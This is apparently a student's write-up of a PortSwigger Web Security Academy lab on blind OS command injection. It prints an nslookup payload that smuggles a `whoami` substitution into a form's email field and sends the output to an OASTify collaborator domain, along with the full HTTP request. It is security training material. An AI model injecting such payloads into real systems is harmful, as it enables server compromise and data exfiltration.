
# 💻 Blind OS Command Injection – OOB Data Exfiltration

> 🧠 **Level**: Practitioner  
> 🌐 **Platform**: PortSwigger Web Security Academy  
> 👩‍💻 **Author**: Kaouthar Belkebir  

---

## 🧩 Lab Description

This lab is vulnerable to **blind OS command injection**.  
The twist? Instead of just confirming command execution via DNS, we extract **data from the server** (like the current user) through **Out-of-Band (OOB) DNS exfiltration**.

🎯 **Goal**:  
Extract the output of the `whoami` command by injecting it into a DNS request that reaches a Burp Collaborator (or OASTify) domain.

---

## 🧪 Exploitation Strategy

### 🧠 Injection Logic:

We leverage command substitution using backticks:
```bash
`whoami`
````

...which executes the `whoami` command and inserts the result in place.

We then wrap that inside an `nslookup` call to **exfiltrate the output**:

```bash
||nslookup `whoami`.attacker.oastify.com||
```

This forces the server to perform a DNS query like:

```bash
<current-user>.attacker.oastify.com
```

…and we catch that request via our **Collaborator/OASTify interface**.

---

## 🧠 Payload Used

```bash
||nslookup `whoami`.255plsvut40fwbds4ix2afddi4ovcl0a.oastify.com||
```

🔐 Injected in the `email` field:

```http
email=hacker1@gmail.com||nslookup `whoami`.255plsvut40fwbds4ix2afddi4ovcl0a.oastify.com||
```

---

## 📥 Full HTTP Request

```http
POST /feedback/submit HTTP/2
Host: 0a4e002f032675f483630676007f0002.web-security-academy.net
Cookie: session=zC5kjBvzIp46s9scyCly7FndTFTcuMNV
Content-Type: application/x-www-form-urlencoded

csrf=yP0mub7Il89tBqWrfKdmVP8xa627BZpL&
name=hacker&
email=hacker1@gmail.com||nslookup `whoami`.255plsvut40fwbds4ix2afddi4ovcl0a.oastify.com||&
subject=blind&
message=blindblind
```

---

## 🧬 Why This Works

* The `email` field is concatenated unsafely into a shell command.
* The shell executes `nslookup`, which includes the result of `whoami`.
* The server performs a DNS request to a domain we control (via Burp Collaborator or OASTify).
* That DNS lookup reveals the **output of the command** — the server’s current user.

---

## 📸 Screenshot (Proof of Concept)

![OOB DNS exfiltration confirmed](https://github.com/Kabilala/OS-command-injection/blob/main/lab5/lab5.png)
